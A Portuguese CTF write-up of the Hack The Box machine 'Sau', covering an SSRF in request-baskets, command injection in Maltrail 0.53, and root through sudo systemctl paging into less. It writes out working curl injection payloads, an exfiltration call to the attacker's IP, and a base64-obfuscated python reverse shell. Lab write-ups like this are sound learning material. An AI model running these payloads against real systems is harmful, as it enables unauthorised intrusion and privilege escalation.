Esse é meu primeiro write-up de uma máquina do Hack The Box, é um resumo de como fiz a exploração da máquina SAU lançada em 2023. É uma máquina de nível fácil e explora falhas como SSRF e Command Injection, então borá lá!

Iniciando a enumeração das portas abertas no alvo e quais os serviços rodando nas respectivas portas: 
```bash
# Identificação das portas abertas:
nmap -Pn -sS 10.10.11.224

#Identificação dos serviços nas portas abertas:
nmap -Pn -sV -sC -p 22,80,55555 10.10.11.224
```

![[Pasted image 20230903211629.png]]
O resultado inicial com nmap nos mostrou as portas 22 e 55555 abertas rodando os protocolos de SSH e HTTP respectivamente, além da porta 80 filtrada, indicando que provavelmente existe um serviço de HTTP rodando ali, mas está sendo filtrado para acesso externo pelo firewall.

Vamos então acessar o serviço rodando na porta 55555 e verificar se conseguimos mais informações.

![[Pasted image 20230903211742.png]]


Ao acessar a porta específica, fomos direcionados para a página inicial de um aplicativo web, o request-baskets na versão 1.2.1.
Conforme documentação oficial, o request-baskets é um serviço de captura de requisições HTTP para análise, resumidamente é possível criar um link personalizado (Basket), capturar as requisição recebidas e visualiza-las a partir de um gerenciador web.
Vamos então criar um novo link e verificar o que mais podemos fazer com ele.

![[Pasted image 20230903213259.png]]
Ao clicar em Open Basket após gerar um link, somos redirecionados para o gerenciador de Baskets onde temos algumas opções, entre elas as de configurações do link personalizado.

Dentro das configurações do link, temos a opção de encaminhar o usuário que acessar o Basket para outro site (Forward URL).
Essa opção acendeu um alerta para a vulnerabilidade de SSRF (Server Side Request Foreign), uma falha onde uma URL maliciosa é enviada para o servidor e o mesmo faz uma requisição para essa URL.

A primeira coisa que me veio a cabeça foi, e se eu tentar fazer a requisição para validar se existe mesmo um serviço rodando internamente na porta 80?

Então configurei a opção Forward URL como http://localhost/ (Quando omitimos a porta da URL, a requisição será enviada com a porta 80 por padrão) e ativei as opçãos Proxy Reponse pra que as respostas recebidas pelo servidor fossem encaminhadas de volta, e a opção Expand Forward Path pra que os diretório que forem adicionar ao final da URL do nosso link, sejam adicionadas a URL de encaminhamento também.

![[Pasted image 20230903215801.png]]

Ao salvar e abrir o link em uma nova guia, somos redirecionados para o serviço rodando internamente no servidor, como suspeitado.

![[Pasted image 20230903214909.png]]

Dessa forma foi possível identificar um outro serviço, o Maltrail na versão 0.53.

O Maltrail é um sistema de detecção de tráfego malicioso e com uma rápida pesquisa na internet, descobrimos uma vulnerabilidade de Command Injection nas versões abaixo da 0.54.

A falha consiste na exploração do parâmetro username, enviado em um método POST na página de login da aplicação localizada em /login. Pra executar comando é necessário somente acrescentar o ; após o valor de username e inserir o comando entre crase.

Vamos então validar a vulnerabilidade enviando uma requisição com o curl. Pra isso montados o seguinte payload:
```bash
curl -i http://10.10.11.224:55555/5n9i9og/login --data 'username=;`id`'
```

![[Pasted image 20230903220729.png]]

Ao enviar o comando recebemos apenas a resposta de falha no login, mas não recebemos a saída do comando id. Pra tirar a dúvida se o RCE estava funcionando ou não resolvi fazer outro teste, ao invés de enviar o id diretamente, abri a porta 80 na minha máquina e enviei uma requisição utilizando curl da máquina alvo pra minha, acrescentando o comando $(id) no final da URL, dessa forma:
```bash
curl -i http://10.10.11.224:55555/5n9i9og/login --data 'username=;`curl http://10.10.14.225/$(id)`'
```

![[Pasted image 20230903221705.png]]
E deu certo! A resposta do comando id retornou no cabeçalho da requisição feita pelo alvo.
Dessa forma foi possível validar que a exploração da vulnerabilidade estava funcionando, podemos agora pegar um shell reversa.
Vamos utilizar um payload de shell reversa em python3 e ofuscado com base64.
Primeiro criptografamos os comandos da shell reversa em Base64:
```bash
echo -n "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"10.10.14.225\",80));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/sh\")'" | base64
```

A técnica de ofuscação consiste em enviar o comando da shell reversa criptografado em base64 e concatenado com os comandos que irão descriptografar o dado e executa-lo respectivamente, ficando então assim nosso payload final:
```bash
echo+{SHELL-EM-B64}+|+base64+-d+|+sh
```

Vamos repetir o processo feito para validar a vulnerabilidade, mas agora enviamos o payload da shell reversa.
![[Pasted image 20230903223743.png]]
Ao enviar a requisição para o servidor, recebemos a shell do alvo em nossa porta aberta.

Capturamos a flag de user da máquina e finalizamos a primeira etapa da exploração. Vamos então seguir para a escalação de privilégio e encontrar a flag de root.

A primeira coisa que faço ao acessar um alvo linux é buscar por binários com permissão SUID, ou seja, são programas que o usuário comum pode executar com privilégios de root, mesmo não sendo.
Utilizando o utilitário find podemos encontrar esses arquivos no alvo:
```bash
find / -perm -u=s -type f 2>/dev/null
```

A pesquisa não retornou nenhum binário em potencial que pudesse ser explorado, então vamos dar uma olhada nas permissões de execução como SUDO, utilizando o comando `sudo -l`.

![[Pasted image 20230904233606.png]]
Agora sim temos algo que podemos explorar, o usuário atual tem permissão de executar o comando systemctl com SUDO sem exigir a senha do mesmo, mas o detalhe é que temos permissão para executar apenas a opção status do serviço trail.service. Nenhuma outra opção ou serviço é permitido.

![[Pasted image 20230904233929.png]]

Depois de algum tempo tentando explorar o systemctl, percebi que quando executado como sudo, a saída do comando entra no modo less. Esse modo permite a visualização da saída do terminal de forma paginada, mas também permite trazer a shell de um usuário durante a paginação.

Vamos então executar o systemctl utilizando sudo e após o inicio da paginação solicitamos a shell com `!sh`.

![[Pasted image 20230904234049.png]]
I am roooooot! 

Conseguimos escalar o privilégio e finalizamos a máquina capturando a flag de root.

Muito obrigado por ter lido até aqui, espero que tenha gostado e em breve pretendo escrever outros write-ups.